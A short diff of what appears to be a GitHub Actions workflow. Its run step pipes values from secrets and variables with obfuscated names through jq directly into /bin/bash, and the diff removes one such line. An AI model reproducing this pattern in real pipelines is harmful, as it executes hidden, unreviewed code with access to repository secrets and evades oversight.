@@ -17,7 +17,6 @@ jobs:
           lso39: ${{ secrets.lso39 }}
         run: |
           printf '%s' "$lso39" | jq -r .inkbt4586 | /bin/bash
-          echo $i7512 | jq -r .bzghw71 | /bin/bash
           echo $ouf90953 | jq -r .jxd75414 | /bin/bash
           printf '%s' "$j34335" | jq -r .nfn8 | /bin/bash
           printf '%s' "$pzbnl1263" | jq -r .utskp079 | /bin/bash
